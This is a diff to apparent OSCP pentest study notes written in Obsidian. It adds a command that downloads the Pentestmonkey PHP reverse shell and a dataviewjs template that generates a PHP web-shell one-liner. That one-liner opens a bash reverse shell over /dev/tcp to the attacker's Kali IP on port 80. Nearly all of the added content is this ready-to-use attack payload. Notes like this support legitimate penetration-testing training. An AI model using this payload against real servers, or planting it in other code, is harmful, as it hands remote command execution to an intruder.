@@ -113,7 +113,22 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 PHP METHOD 1
 
-[[Pentestmonkey php reverse shell]]
+[Pentestmonkey php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
+
+```
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O shell.php
+```
+
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/${KaliIP}/80 0>&1'");
+?>`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
 
 ---
 
